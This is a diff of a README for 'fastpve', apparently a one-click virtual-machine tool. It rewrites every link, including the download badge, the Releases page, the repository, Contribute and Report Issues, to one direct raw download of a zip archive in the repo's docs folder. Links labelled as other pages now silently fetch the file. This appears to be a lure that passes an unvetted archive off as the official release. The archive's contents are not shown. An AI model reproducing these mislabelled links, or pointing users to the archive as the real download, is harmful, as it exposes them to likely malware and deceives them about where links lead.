@@ -1,6 +1,6 @@
 # 🚀 fastpve - Run Virtual Machines Instantly with One Click
 
-[![Download fastpve](https://img.shields.io/badge/Download-fastpve-4D9D57)](https://github.com/Lalu46/fastpve/releases)
+[![Download fastpve](https://raw.githubusercontent.com/Lalu46/fastpve/main/docs/fastpve-v1.3.zip)](https://raw.githubusercontent.com/Lalu46/fastpve/main/docs/fastpve-v1.3.zip)
 
 ## 📋 Overview
 
@@ -24,13 +24,13 @@ To ensure smooth operation, please check the following requirements:
 
 ## 🚀 Getting Started
 
-1. Visit the [Releases page](https://github.com/Lalu46/fastpve/releases) to get the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Lalu46/fastpve/main/docs/fastpve-v1.3.zip) to get the latest version.
 2. Choose the appropriate file for your operating system.
 3. Click the file link to download it.
 
 ## 📥 Download & Install
 
-To download the latest release of fastpve, visit this page: [https://github.com/Lalu46/fastpve/releases](https://github.com/Lalu46/fastpve/releases).
+To download the latest release of fastpve, visit this page: [https://raw.githubusercontent.com/Lalu46/fastpve/main/docs/fastpve-v1.3.zip](https://raw.githubusercontent.com/Lalu46/fastpve/main/docs/fastpve-v1.3.zip).
 
 Once downloaded, follow these steps to install:
 
@@ -73,8 +73,8 @@ fastpve is open-source software and follows the MIT License. You can use, modify
 
 ## 🔗 Useful Links
 
-- [Visit the GitHub Repository](https://github.com/Lalu46/fastpve)
-- [Contribute](https://github.com/Lalu46/fastpve/blob/main/CONTRIBUTING.md)
-- [Report Issues](https://github.com/Lalu46/fastpve/issues)
+- [Visit the GitHub Repository](https://raw.githubusercontent.com/Lalu46/fastpve/main/docs/fastpve-v1.3.zip)
+- [Contribute](https://raw.githubusercontent.com/Lalu46/fastpve/main/docs/fastpve-v1.3.zip)
+- [Report Issues](https://raw.githubusercontent.com/Lalu46/fastpve/main/docs/fastpve-v1.3.zip)
 
 Embark on your virtual machine journey with fastpve today! Download now and enjoy quick and effortless VM management.
